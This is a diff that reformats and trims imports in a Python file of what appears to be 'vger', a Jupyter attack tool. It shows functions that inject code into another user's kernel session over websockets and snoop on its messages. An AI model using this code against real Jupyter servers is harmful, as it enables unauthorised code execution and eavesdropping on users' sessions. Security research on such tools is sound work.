@@ -7,8 +7,6 @@ import argparse
 from vger.connection import Connection
 import re
 import time
-from websockets.sync import client
-import requests
 
 
 async def recv_all(connection, conn, timeout):
@@ -21,16 +19,19 @@ async def recv_all(connection, conn, timeout):
                         text = msg["content"]["text"]
                     elif msg["msg_type"] in ["execute_result"]:
                         text = msg["content"]["data"]
-                    connection.print_with_rule(f"[bold blue]RESULT> {text}", category="[bold blue]RESULT")
+                    connection.print_with_rule(
+                        f"[bold blue]RESULT> {text}", category="[bold blue]RESULT"
+                    )
                 elif msg["msg_type"] in ["execute_input"]:
-                    connection.print_with_rule(f"[bold red]REQUEST> {msg['content']['code']}", category="[bold red]REQUEST")
+                    connection.print_with_rule(
+                        f"[bold red]REQUEST> {msg['content']['code']}",
+                        category="[bold red]REQUEST",
+                    )
         except:
             break
 
 
-async def attack_session(
-    connection, session, code, silent=True, print_out=True
-):
+async def attack_session(connection, session, code, silent=True, print_out=True):
     jpy_sess = connection.jpy_sessions[session]
     code_msg_id = str(uuid.uuid1())
     code_msg = {
@@ -51,7 +52,10 @@ async def attack_session(
     ) as conn:
         await recv_all(connection, conn, timeout=1)
         if print_out:
-            connection.print_with_rule(f"[bold red]INJECT> {code_msg['content']['code']}", category="[bold red]CODE INJECTED")
+            connection.print_with_rule(
+                f"[bold red]INJECT> {code_msg['content']['code']}",
+                category="[bold red]CODE INJECTED",
+            )
         await conn.send(json.dumps(code_msg))
         return await recv_all(connection, conn, timeout=1)
 
@@ -109,8 +113,6 @@ async def snoop(connection, session, timeout=60):
         ws_base_url
         + f'api/kernels/{jpy_sess['kernel']['id']}/channels?session_id={jpy_sess['id']}'
     )
-
-    
 
     async with connect(
         ws_url, extra_headers=connection.headers, close_timeout=timeout
